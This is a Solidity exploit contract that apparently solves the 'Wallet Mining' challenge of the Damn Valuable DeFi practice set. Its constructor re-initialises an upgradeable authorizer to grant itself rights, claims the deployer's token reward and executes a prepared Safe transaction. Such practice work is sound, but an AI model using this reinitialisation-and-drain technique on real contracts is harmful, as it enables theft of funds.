pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
import {Create2} from "@openzeppelin/contracts/utils/Create2.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
import {AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy} from "../../src/wallet-mining/AuthorizerFactory.sol";

contract Exploit {
    constructor(
        DamnValuableToken token,
        AuthorizerUpgradeable authorizer,
        WalletDeployer walletDeployer,
        address safe,
        address ward,
        bytes memory initializer,
        uint256 saltNonce,
        bytes memory txData
    ) {
        address[] memory wards = new address[](1);
        address[] memory aims = new address[](1);

        wards[0] = address(this);
        aims[0] = safe;

        authorizer.init(wards, aims);

        bool success = walletDeployer.drop(
            address(safe),
            initializer,
            saltNonce
        );
        require(success, "deploy failed");
        token.transfer(ward, token.balanceOf(address(this)));
        (success, ) = safe.call(txData);
        require(success, "tx failed");
    }
}
